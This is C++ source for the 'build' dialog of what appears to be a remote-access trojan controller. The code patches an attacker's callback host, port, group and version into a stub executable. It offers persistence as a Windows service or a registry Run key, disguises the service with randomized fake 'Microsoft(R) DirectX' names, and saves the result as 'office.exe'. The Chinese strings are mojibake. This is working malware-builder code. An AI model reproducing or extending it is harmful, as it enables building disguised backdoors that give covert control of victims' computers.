// Build.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "Build.h"
#include "encode.h"
#include "TabView.h"
#include "MD5.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CTabView* g_pTabView; 
/////////////////////////////////////////////////////////////////////////////
// CBuild dialog


CBuild::CBuild(CWnd* pParent /*=NULL*/)
	: CDialog(CBuild::IDD, pParent)
{
	//{{AFX_DATA_INIT(CBuild)
	m_green = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "Green", FALSE);
	//}}AFX_DATA_INIT
}


void CBuild::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBuild)
	DDX_Control(pDX, IDC_BIAOZHI, m_biaozhi);
	DDX_Control(pDX, IDC_INSTALL_WAY, m_insatll_way);
	DDX_Control(pDX, IDC_EDIT_SVCNAME, m_svcname);
	DDX_Control(pDX, IDC_EDIT_SHELP, m_shelp);
	DDX_Control(pDX, IDC_EDIT_SCNAME, m_scname);
	DDX_Control(pDX, IDC_VERSION, m_version);
	DDX_Control(pDX, IDC_PORT, m_port);
	DDX_Control(pDX, IDC_DNS, m_dns);
	DDX_Control(pDX, IDC_ONLINE_GROUP, m_online_group);
	DDX_Check(pDX, IDC_GREEN, m_green);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CBuild, CDialog)
	//{{AFX_MSG_MAP(CBuild)
	ON_BN_CLICKED(IDC_BUILD, OnBuild)
	ON_BN_CLICKED(IDC_GREEN, OnGreen)
	ON_CBN_SELCHANGE(IDC_INSTALL_WAY, OnSelchangeInstallWay)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBuild message handlers
char *StrAdd()	// GetVolumeInformation + GetComputerName
{
	LPCTSTR   new_name = "hbturkey";
	LPTSTR    pcname   = new   char[256];
	LPDWORD   nSize    = new   unsigned   long(256);
	BOOL   nRet=GetComputerName(pcname,nSize);
	
	CString strValue       = _T("");
	//LPTSTR   lpBuffer=new   char[256];
	//������������к�   
	LPCTSTR   lpRootPathName   =   "C:\\";   
	LPTSTR   lpVolumeNameBuffer=new   char[12];   
	DWORD   nVolumeNameSize=12;   
	DWORD   VolumeSerialNumber;   
	DWORD   MaximumComponentLength;   
	DWORD   FileSystemFlags;   
	LPTSTR   lpFileSystemNameBuffer=new   char[10];   
	DWORD   nFileSystemNameSize=10;   
	GetVolumeInformation(lpRootPathName,lpVolumeNameBuffer,nVolumeNameSize,&VolumeSerialNumber,     
		&MaximumComponentLength,&FileSystemFlags,lpFileSystemNameBuffer,nFileSystemNameSize);   
	//��ʾ���������к�   
	CString   str;   
	//str.Format("������%s�����к�Ϊ%x",lpRootPathName,VolumeSerialNumber);
	str.Format("%x",VolumeSerialNumber);
    char *lpBuffer = str.GetBuffer(str.GetLength() + 1);
    str.ReleaseBuffer();
	//::MessageBox(0,lpBuffer,"GetVolumeInformation",MB_ICONINFORMATION);
	//::MessageBox(0,pcname,"GetComputerName",MB_ICONINFORMATION);
	strcat(lpBuffer, pcname);
	//::MessageBox(0,lpBuffer,"GetVolumeInformation + GetComputerName",MB_ICONINFORMATION);
	return lpBuffer;
}

BOOL CBuild::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	if (m_bFirstShow)
	{
		CString IP;
		
		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
			IP = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
		else
			IP = _T("127.0.0.1");	
		
		UpdateData(false);
		
		char chSvcName[128]={0},chSvcnName[128]={0},chHelpName[128]={0};
		wsprintf(chSvcName,"DirectX %c%c%c",'a'+rand()%25,'a'+rand()%25,'a'+rand()%25);
		wsprintf(chSvcnName,"DirectX Remover %c%c%c for Windows(R).",'a'+rand()%25,'a'+rand()%25,'a'+rand()%25);
		wsprintf(chHelpName,"Microsoft(R) DirectX %c%c%c for Windows(R).",'a'+rand()%25,'a'+rand()%25,'a'+rand()%25);

		SetDlgItemText(IDC_DNS,  ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "Dns", IP));
		SetDlgItemText(IDC_PORT, ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "PORT", "81"));
		SetDlgItemText(IDC_VERSION, ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "Version", "v1.3"));
		SetDlgItemText(IDC_EDIT_SVCNAME,((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "ServiceName", chSvcName));
		SetDlgItemText(IDC_EDIT_SCNAME,((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "DisplayName", chSvcnName));
		SetDlgItemText(IDC_EDIT_SHELP,((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "Description", chHelpName));
	}

	m_bFirstShow = false;
	
	UpdateData(false);
	
	CString strGroupName, strTemp;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	int i=0;
	for ( i = 0; i < nTabs; i++ )
	{
		strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
		int n = strTemp.ReverseFind('(');
		if ( n > 0 )
		{
			strGroupName = strTemp.Left(n);
		}
		else
		{
			strGroupName = strTemp;
		}
		m_online_group.AddString(strGroupName);
	}
	m_online_group.SetCurSel(0);
	m_insatll_way.SetCurSel(0);
	
	m_green = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "Green", m_green);
	if ( ((CButton *)GetDlgItem(IDC_GREEN))->GetCheck() == TRUE )
	{
		GetDlgItem(IDC_INSTALL_WAY)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(FALSE);
	}
	else
	{
		GetDlgItem(IDC_INSTALL_WAY)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(TRUE);
	}

	GetDlgItem(IDC_BIAOZHI)->SetWindowText(MD5String(StrAdd()));

	UpdateData(false);

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

MODIFY_DATA modify_data = 
{
	"           D         ",
		80,
		"",
		"",
		"",
		"",
		"",
		"",
		TRUE,			//TRUEΪ��������
		TRUE,			//TRUEΪ˫����
		TRUE,			//FALSEΪ��װ,TRUEΪ��ɫ��װ
};

int MemFindStr(const char *strMem, const char *strSub, int iSizeMem, int isizeSub)   
{   
	int   da,i,j;   
	if (isizeSub == 0) 
		da = strlen(strSub);   
	else 
		da = isizeSub;   
	for (i = 0; i < iSizeMem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (strMem[i+j] != strSub[j])	
				break;   
			if (j == da) 
				return i;   
	}  
	
	return -1;   
}

void CBuild::OnBuild() 
{
	// TODO: Add your control notification handler code here
	CString strHost, strPort, strGroup, strVersion, strSer, strSerDis, strSerDes, strGetGroupName;
	
	GetDlgItem(IDC_DNS)->GetWindowText(strHost);
	GetDlgItem(IDC_PORT)->GetWindowText(strPort);
	GetDlgItem(IDC_VERSION)->GetWindowText(strVersion);

	GetDlgItem(IDC_EDIT_SVCNAME)->GetWindowText(strSer);
	GetDlgItem(IDC_EDIT_SCNAME)->GetWindowText(strSerDis);
	GetDlgItem(IDC_EDIT_SHELP)->GetWindowText(strSerDes);

	GetDlgItem(IDC_BIAOZHI)->GetWindowText(strGetGroupName);

	if (strHost.IsEmpty() || strPort.IsEmpty() )
	{
		AfxMessageBox("��������д���ߵ�ַ���߶˿�");
		return;
	}

	((CComboBox*)GetDlgItem(IDC_ONLINE_GROUP))->GetWindowText(strGroup);
	if (strGroup.IsEmpty())
	{
		AfxMessageBox("��������д������");
		return;
	}

	CString OnInstallWay;
	m_insatll_way.GetLBText(m_insatll_way.GetCurSel(),OnInstallWay); 
	
	if(!m_green)
	{
		if (OnInstallWay == "��������")
		{
			if (strSer.IsEmpty() || strSerDis.IsEmpty() || strSerDes.IsEmpty() )
			{
				AfxMessageBox("��������д����������Ϣ");
				return;
			}
		}
	}

	ZeroMemory(&modify_data,sizeof(MODIFY_DATA));
	strcpy(modify_data.szDns,MyEncode(strHost.GetBuffer(0)));
/*	strcpy(modify_data.dwPort,MyEncode(strPort.GetBuffer(0)));*/
	strcpy(modify_data.szGroup,MyEncode(strGroup.GetBuffer(0)));
	strcpy(modify_data.szVersion,MyEncode(strVersion.GetBuffer(0)));
	strcpy(modify_data.SerName, strSer.GetBuffer(0));
	strcpy(modify_data.Serdisplay, strSerDis.GetBuffer(0));
	strcpy(modify_data.Serdesc, strSerDes.GetBuffer(0));
	strcpy(modify_data.szGetGroup, strGetGroupName.GetBuffer(0));

	if (OnInstallWay == "��������")
	{
		m_Servers = TRUE;
		m_RunUP = FALSE;
		modify_data.bServer = m_Servers;
		modify_data.bRuns = m_RunUP;
	}

	if (OnInstallWay == "ע���������")
	{
		m_Servers = FALSE;
		m_RunUP = TRUE;
		modify_data.bServer = m_Servers;
		modify_data.bRuns = m_RunUP;
	}

	modify_data.bRunOnce = m_green;

	CFileDialog dlg(FALSE, "exe", "office.exe", OFN_OVERWRITEPROMPT,"��ִ���ļ�|*.exe", NULL);
	if(dlg.DoModal () != IDOK)
		return;
	modify_data.dwPort = atoi((LPCSTR)strPort);
	CHAR DatPath[MAX_PATH];

	
	GetModuleFileName( NULL, DatPath, sizeof(DatPath) );
	*strrchr( DatPath, '\\' ) = '\0';
	lstrcat( DatPath, "\\Cache\\Install.dat" );
	
	CFile file;
	BYTE *rstdata;
	DWORD dwSize,dwWritten;
	HANDLE hUpdateRes;
	BOOL result;
	HANDLE hFile9;
	LPBYTE p;
	file.Open(DatPath, CFile::modeRead);
	dwSize=file.GetLength();        
	rstdata=new BYTE[dwSize];
	file.ReadHuge(rstdata, dwSize);
	file.Close();
	
	p = (LPBYTE)GlobalAlloc(GPTR, dwSize);
	if (p == NULL)
	{
		return ;
	}
	
	CopyMemory((LPVOID)p, (LPCVOID)rstdata, dwSize);
	
	char *dksD="           D         ";
	int iPosD = MemFindStr((const char *)p, dksD, dwSize, strlen(dksD));
	CopyMemory((LPVOID)(p + iPosD), (LPCVOID)&modify_data,sizeof(MODIFY_DATA));
	
	HANDLE hFile;
	hFile = CreateFile(dlg.GetPathName(),GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
	if(hFile == NULL) 
	{
		DeleteFile(dlg.GetPathName());
		MessageBox("�ļ�����ʧ�ܣ�����","��ʾ",MB_OK|MB_ICONSTOP);
		return;
	}
	
	WriteFile(hFile,(LPVOID)p,dwSize,&dwWritten,NULL);
	if(hFile)
		CloseHandle(hFile);
	
	if(rstdata)
		GlobalFree(rstdata);
	if(p)
		GlobalFree(p);
	
	//����������Ϣ
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Dns", strHost);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Version", strVersion);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Port", strPort);
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "Green", m_green);

	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "ServiceName", strSer);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "DisplayName", strSerDis);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Description", strSerDes);

	MessageBox("�ļ�����ɹ�!","��ʾ", MB_ICONINFORMATION);
}

void CBuild::OnGreen() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	if(m_green)
	{
		GetDlgItem(IDC_INSTALL_WAY)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(FALSE);
	}
	else
	{
		GetDlgItem(IDC_INSTALL_WAY)->EnableWindow(TRUE);
		OnSelchangeInstallWay();
	}
	UpdateData(FALSE);
}

void CBuild::OnSelchangeInstallWay() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	CString OnInstallWay;
	
	m_insatll_way.GetLBText(m_insatll_way.GetCurSel(),OnInstallWay); 
	
	if (OnInstallWay == "��������")
	{
		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(TRUE);
	}
	if (OnInstallWay=="ע���������")
	{
		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(FALSE);
	}
	UpdateData(FALSE);
}
